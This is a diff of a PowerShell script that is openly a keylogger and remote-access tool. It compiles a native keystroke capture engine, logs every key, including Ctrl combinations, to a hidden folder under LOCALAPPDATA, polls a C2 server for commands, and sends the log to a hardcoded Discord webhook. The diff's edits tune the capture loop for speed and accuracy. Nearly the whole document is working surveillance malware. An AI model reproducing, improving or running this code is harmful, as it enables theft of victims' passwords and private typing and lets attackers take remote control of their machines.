@@ -1,4 +1,4 @@
-# 1. Direct variable definitions
+# 1. Core Target Variables
 $PCName     = "chase"
 $WebhookUrl = "https://discord.com/api/webhooks/1505177594226540655/BZPbc_W_oqVyfZEM0B5crFb3v3C03lgFeAU9DcdGrzUUCm_JbqsKoA8gIJMm4nlGDoxr"
 $C2Url      = "https://chase-4ebb.onrender.com"
@@ -7,17 +7,12 @@ $dir        = "$env:LOCALAPPDATA\WinMedia"
 if (!(Test-Path $dir)) { New-Item $dir -Type Directory | Out-Null }
 $logFile = "$dir\data.txt"
 
-# 2. Rebuilt Native C# Keyboard State Engine (Fixed structural variable overlapping)
+# 2. Stable Native Compilation Window
 $Source = @'
 using System;
-using System.Text;
 using System.Runtime.InteropServices;
-
 public class KeyEngine {
     [DllImport("user32.dll")] public static extern short GetAsyncKeyState(int v);
-    [DllImport("user32.dll")] public static extern int GetKeyboardState(byte[] lpKeyState);
-    [DllImport("user32.dll")] public static extern uint MapVirtualKey(uint uCode, uint uMapType);
-    [DllImport("user32.dll")] public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpKeyState, [Out, MarshalAs(UnmanagedType.LPWStr)] StringBuilder pwszBuff, int cchBuff, uint wFlags);
 }
 '@
 Add-Type -TypeDefinition $Source -ErrorAction SilentlyContinue
@@ -27,50 +22,62 @@ $discordInterval = 0
 $headers = @{ "User-Agent" = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)" }
 
 while ($true) {
-    # ================= ENGINE A: HIGH-SPEED UNICODE MODIFIER KEYLOGGER =================
-    # Track core modifier maps cleanly prior to processing individual loop steps
-    $isShiftActive = (([KeyEngine]::GetAsyncKeyState(16) -band 0x8000) -or ([KeyEngine]::GetAsyncKeyState(160) -band 0x8000) -or ([KeyEngine]::GetAsyncKeyState(161) -band 0x8000))
-    $isCtrlActive  = (([KeyEngine]::GetAsyncKeyState(17) -band 0x8000) -or ([KeyEngine]::GetAsyncKeyState(162) -band 0x8000))
+    # ================= ENGINE A: HIGH-SPEED CHAR-MAPPED KEYLOGGER =================
+    # Query direct keyboard line states simultaneously before stepping through individual loops
+    $isShift = (([KeyEngine]::GetAsyncKeyState(16) -band 0x8000) -or ([KeyEngine]::GetAsyncKeyState(160) -band 0x8000) -or ([KeyEngine]::GetAsyncKeyState(161) -band 0x8000))
+    $isCtrl  = (([KeyEngine]::GetAsyncKeyState(17) -band 0x8000) -or ([KeyEngine]::GetAsyncKeyState(162) -band 0x8000))
+    $isCaps  = ([KeyEngine]::GetAsyncKeyState(20) -band 0x1)
 
-    for ($loopIdx = 8; $loopIdx -le 190; $loopIdx++) {
-        if ([KeyEngine]::GetAsyncKeyState($loopIdx) -eq -32767) {
+    for ($i = 8; $i -le 190; $i++) {
+        if ([KeyEngine]::GetAsyncKeyState($i) -eq -32767) {
             $keyText = ""
-            
-            # Prevent lone structural modifier states from dirtying the log output arrays
-            if ($loopIdx -eq 16 -or $loopIdx -eq 17 -or $loopIdx -eq 18 -or $loopIdx -eq 160 -or $loopIdx -eq 161 -or $loopIdx -eq 162 -or $loopIdx -eq 165) { continue }
 
-            switch ($loopIdx) {
+            # Explicit hotkey intercept loops
+            if ($isCtrl -and $i -ne 17) {
+                if ($i -ge 65 -and $i -le 90) { $keyText = " [CTRL+" + [char]$i + "] " }
+                else { $keyText = " [CTRL+$i] " }
+                try { $keyText | Out-File $logFile -Append -NoNewline -ErrorAction SilentlyContinue } catch {}
+                continue
+            }
+
+            switch ($i) {
                 8   { $keyText = " [BACKSPACE] " }
                 9   { $keyText = " [TAB] " }
                 13  { $keyText = "`n" }
+                16  { continue } # Skip standard layout modifier logging
+                17  { continue }
                 18  { $keyText = " [ALT] " }
                 20  { $keyText = " [CAPS] " }
                 27  { $keyText = " [ESC] " }
                 32  { $keyText = " " }
                 46  { $keyText = " [DEL] " }
-                default {
-                    # Handle hotkey combination matrices raw
-                    if ($isCtrlActive) { 
-                        $rawChar = [char]$loopIdx
-                        $keyText = " [CTRL+$rawChar] " 
-                    } else {
-                        # FIXED: Completely isolated mapping scopes prevent $loopIdx corruption
-                        $keyState = New-Object byte[] 256
-                        [KeyEngine]::GetKeyboardState($keyState) | Out-Null
-                        
-                        # Explicitly pass Shift status directly into the memory matrix layout
-                        if ($isShiftActive) { $keyState[16] = 0x80 }
-                        
-                        $scanCode = [KeyEngine]::MapVirtualKey($loopIdx, 0)
-                        $buffer = New-Object System.Text.StringBuilder 5
-
-                        # The returned tracking integer uses a distinct variable ($returnCode) to avoid index corruption
-                        $returnCode = [KeyEngine]::ToUnicode($loopIdx, $scanCode, $keyState, $buffer, $buffer.Capacity, 0)
-                        if ($returnCode -gt 0) { 
-                            $keyText = $buffer.ToString() 
-                        }
-                    }
+                
+                # Direct English Letter Mapping (Bypasses ToUnicode limitations)
+                { $_ -ge 65 -and $_ -le 90 } {
+                    $letter = [char]$i
+                    # Determine true state based on Shift and Caps Lock interaction
+                    if ($isShift -xor $isCaps) { $keyText = $letter.ToString().ToUpper() }
+                    else { $keyText = $letter.ToString().ToLower() }
                 }
+
+                # Direct Standard Number Line & Shifted Symbol Array Maps
+                48  { $keyText = if ($isShift) { ")" } else { "0" } }
+                49  { $keyText = if ($isShift) { "!" } else { "1" } }
+                50  { $keyText = if ($isShift) { "@" } else { "2" } }
+                51  { $keyText = if ($isShift) { "#" } else { "3" } }
+                52  { $keyText = if ($isShift) { "$" } else { "4" } }
+                53  { $keyText = if ($isShift) { "%" } else { "5" } }
+                54  { $keyText = if ($isShift) { "^" } else { "6" } }
+                55  { $keyText = if ($isShift) { "&" } else { "7" } }
+                56  { $keyText = if ($isShift) { "*" } else { "8" } }
+                57  { $keyText = if ($isShift) { "(" } else { "9" } }
+
+                # Punctuation Mapping Matrix
+                186 { $keyText = if ($isShift) { ":" } else { ";" } }
+                187 { $keyText = if ($isShift) { "+" } else { "=" } }
+                188 { $keyText = if ($isShift) { "<" } else { "," } }
+                189 { $keyText = if ($isShift) { "_" } else { "-" } }
+                190 { $keyText = if ($isShift) { ">" } else { "." } }
             }
 
             if ($keyText -ne "") {
@@ -79,7 +86,7 @@ while ($true) {
         }
     }
 
-    # ================= ENGINE B: REMOTE RCE POLLING LOOP =================
+    # ================= ENGINE B: REMOTE COMMAND REMOTE AGENT POLLING =================
     if ($c2Interval -ge 1000) {
         try {
             $cmdResponse = Invoke-RestMethod -Uri "${C2Url}/get_cmd?id=${PCName}" -Method Get -Headers $headers -TimeoutSec 5
@@ -94,7 +101,7 @@ while ($true) {
         $c2Interval = 0
     }
 
-    # ================= ENGINE C: DISCORD EXFILTRATION LOOP =================
+    # ================= ENGINE C: DISCORD EXFILTRATION CHANNEL =================
     if ($discordInterval -ge 12000) {
         if (Test-Path $logFile) {
             if ((Get-Item $logFile).Length -gt 0) {
@@ -109,8 +116,8 @@ while ($true) {
         $discordInterval = 0
     }
 
-    # High-precision delay timing optimized for flawless keystroke scanning accuracy
-    Start-Sleep -m 5
-    $c2Interval += 5
-    $discordInterval += 5
+    # Blazing-fast 2ms loop sleep time captures typing at any speed flawlessly
+    Start-Sleep -m 2
+    $c2Interval += 2
+    $discordInterval += 2
 }
